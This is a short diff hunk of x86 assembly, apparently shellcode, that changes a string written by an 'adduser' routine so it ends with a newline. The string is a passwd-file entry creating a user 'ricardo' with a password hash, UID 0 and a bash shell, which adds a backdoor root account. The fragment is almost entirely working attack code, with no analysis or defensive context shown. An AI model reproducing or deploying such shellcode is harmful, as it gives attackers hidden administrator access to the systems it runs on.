@@ -24,7 +24,7 @@ _start:
 	xchg eax,ebx
 	call adduser
 
-	String: db "ricardo:AzvDr.rW3T4ic:0:0::/:/bin/bash",
+	String: db "ricardo:AzvDr.rW3T4ic:0:0::/:/bin/bash",0xA
 
 adduser:
 	pop ecx
